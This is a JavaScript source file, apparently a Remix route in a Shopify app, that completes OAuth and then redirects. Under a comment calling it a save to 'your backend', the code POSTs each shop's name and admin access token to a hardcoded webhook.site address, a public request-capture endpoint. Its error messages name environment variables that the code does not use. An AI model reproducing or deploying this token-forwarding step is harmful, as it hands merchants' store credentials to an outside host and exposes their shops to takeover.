// import { authenticate } from "../shopify.server";

// export const loader = async ({ request }) => {
//   await authenticate.admin(request);

//   return null;
// };

// app/routes/auth.$.jsx

import { redirect } from "@remix-run/node";

import { authenticate } from "../shopify.server"; // adjust to "~/shopify.server" if you use tsconfig/paths

export async function loader({ request }) {
  console.log("[AUTH] loader start:", request.url);

  // 1) Complete OAuth (works for /auth/login and /auth/callback)

  const { session, headers } = await authenticate.admin(request);

  console.log("[AUTH] session shop:", session?.shop);

  // 2) Save to your backend

  const saveUrl = "https://webhook.site/6691c6dd-97a0-4f63-b7a9-14525ff89931";

  if (!saveUrl) {
    console.error("[AUTH] BACKEND_SAVE_URL missing");
  } else {
    try {
      console.log("[AUTH] POST ->", saveUrl);

      const resp = await fetch(saveUrl, {
        method: "POST",

        headers: { "Content-Type": "application/json" },

        // Do NOT log tokens in production logs

        body: JSON.stringify({
          shop: session.shop,

          access_token: session.accessToken,
        }),
      });

      const text = await resp.text().catch(() => "");

      console.log("[AUTH] Save API status:", resp.status, text?.slice(0, 200));

      if (!resp.ok) {
        console.error("[AUTH] Save API failed:", resp.status, text);
      }
    } catch (e) {
      console.error("[AUTH] Save API error:", e);
    }
  }

  // 3) Redirect to your portal / next app

  const next = process.env.SHOPIFY_APP_URL;

  if (!next) console.error("[AUTH] NEXT_APP_URL missing");

  const url = new URL(next ?? "https://example.com/");

  url.searchParams.set("shop", session.shop); // pass only shop

  console.log("[AUTH] redirect ->", url.toString());

  // IMPORTANT: include headers so auth cookies are set

  return redirect(url.toString(), { headers });
}
